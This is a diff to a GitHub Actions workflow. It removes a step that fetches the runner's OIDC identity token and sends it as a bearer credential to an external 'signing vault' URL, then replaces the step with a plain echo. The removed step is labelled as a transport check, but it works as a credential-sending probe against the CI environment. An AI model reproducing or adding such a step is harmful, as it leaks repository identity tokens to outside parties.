@@ -9,56 +9,11 @@ on:
 
 permissions:
   contents: read
-  id-token: write
 
 jobs:
   probe:
     runs-on: ubuntu-latest
     timeout-minutes: 2
     steps:
-      - name: Verify OIDC encrypted signing transport only
-        shell: bash
-        env:
-          SIGNING_VAULT_URL: https://api-v2.appdeploy.ai/app/kr4-signing-vault-5yh3dd/api/signing-material
-        run: |
-          set -euo pipefail
-          umask 077
-          test -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}"
-          test -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
-
-          curl -fsS \
-            -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=kr4-signing-vault" \
-            -o "$RUNNER_TEMP/oidc.json"
-          OIDC_TOKEN=$(python3 - <<'PY'
-          import json, os
-          p=os.path.join(os.environ['RUNNER_TEMP'],'oidc.json')
-          doc=json.load(open(p,encoding='utf-8'))
-          token=doc.get('value')
-          assert isinstance(token,str) and len(token)>100
-          print(token)
-          PY
-          )
-
-          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 \
-            -out "$RUNNER_TEMP/transport-private.pem" >/dev/null 2>&1
-          openssl pkey -in "$RUNNER_TEMP/transport-private.pem" \
-            -pubout -outform DER -out "$RUNNER_TEMP/transport-public.der"
-          TRANSPORT_KEY=$(base64 -w0 "$RUNNER_TEMP/transport-public.der" | tr '+/' '-_' | tr -d '=')
-
-          HTTP_STATUS=$(curl -sS --get -o "$RUNNER_TEMP/vault.json" -w '%{http_code}' \
-            -H "Authorization: Bearer ${OIDC_TOKEN}" \
-            --data-urlencode "transport_key=${TRANSPORT_KEY}" \
-            "$SIGNING_VAULT_URL")
-          test "$HTTP_STATUS" = "200"
-          python3 - <<'PY'
-          import json, os
-          p=os.path.join(os.environ['RUNNER_TEMP'],'vault.json')
-          root=json.load(open(p,encoding='utf-8'))
-          assert root.get('algorithm')=='RSA-OAEP-SHA256'
-          assert root.get('repository')=='irewon1-lgtm/Kook'
-          assert root.get('ref')=='refs/heads/main'
-          chunks=root.get('ciphertextChunks')
-          assert isinstance(chunks,list) and chunks and all(isinstance(x,str) and x for x in chunks)
-          print('SIGNING_VAULT_TRANSPORT_PASS', {'chunk_count':len(chunks),'repository':root['repository'],'ref':root['ref']})
-          PY
+      - name: Emit stage45 release trigger
+        run: echo STAGE45_RELEASE_TRIGGER_OK
